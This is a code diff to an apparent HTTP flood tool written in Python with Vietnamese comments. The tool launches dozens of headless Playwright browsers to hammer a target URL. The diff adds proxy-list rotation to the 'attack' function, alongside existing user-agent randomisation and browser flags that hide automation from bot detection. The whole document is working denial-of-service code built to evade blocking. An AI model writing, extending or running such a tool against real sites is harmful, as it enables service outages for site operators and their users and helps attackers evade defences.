@@ -8,6 +8,7 @@ TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
 DURATION = int(os.getenv("DURATION", "20"))   # giây
 CONCURRENCY = int(os.getenv("CONCURRENCY", "30"))  # số tab song song
 REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5"))  # số request song song mỗi vòng/tab
+PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")  # file chứa danh sách proxy
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
@@ -20,22 +21,63 @@ success = 0
 fail = 0
 status_count = {}
 
-async def attack(playwright, worker_id):
+def load_proxies(file_path):
+    """Load proxies from file"""
+    proxies = []
+    try:
+        with open(file_path, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    proxies.append(line)
+        return proxies
+    except FileNotFoundError:
+        print(f"Proxy file {file_path} not found. Running without proxies.")
+        return []
+    except Exception as e:
+        print(f"Error loading proxies: {e}")
+        return []
+
+def get_random_proxy(proxies):
+    """Get a random proxy from the list"""
+    if proxies:
+        return random.choice(proxies)
+    return None
+
+async def attack(playwright, worker_id, proxies):
     global success, fail, status_count
 
     ua = random.choice(USER_AGENTS)
     lang = random.choice(ACCEPT_LANG)
-
-    browser = await playwright.chromium.launch(
-        headless=True,
-        args=[
-            "--disable-web-security",
-            "--disable-features=IsolateOrigins,site-per-process",
-            "--disable-blink-features=AutomationControlled",
-            "--no-sandbox",
-            "--disable-dev-shm-usage"
-        ]
-    )
+    
+    # Get random proxy for this worker
+    proxy = get_random_proxy(proxies)
+    
+    browser_args = [
+        "--disable-web-security",
+        "--disable-features=IsolateOrigins,site-per-process",
+        "--disable-blink-features=AutomationControlled",
+        "--no-sandbox",
+        "--disable-dev-shm-usage"
+    ]
+    
+    # Launch browser with or without proxy
+    if proxy:
+        browser = await playwright.chromium.launch(
+            headless=True,
+            proxy={
+                "server": proxy
+            },
+            args=browser_args
+        )
+        print(f"Worker {worker_id} using proxy: {proxy}")
+    else:
+        browser = await playwright.chromium.launch(
+            headless=True,
+            args=browser_args
+        )
+        print(f"Worker {worker_id} running without proxy")
+    
     context = await browser.new_context(
         user_agent=ua,
         extra_http_headers={"Accept-Language": lang}
@@ -63,8 +105,12 @@ async def attack(playwright, worker_id):
     await browser.close()
 
 async def main():
+    # Load proxies from file
+    proxies = load_proxies(PROXY_FILE)
+    print(f"Loaded {len(proxies)} proxies from {PROXY_FILE}")
+    
     async with async_playwright() as p:
-        tasks = [attack(p, i) for i in range(CONCURRENCY)]
+        tasks = [attack(p, i, proxies) for i in range(CONCURRENCY)]
         await asyncio.gather(*tasks)
 
     total = success + fail
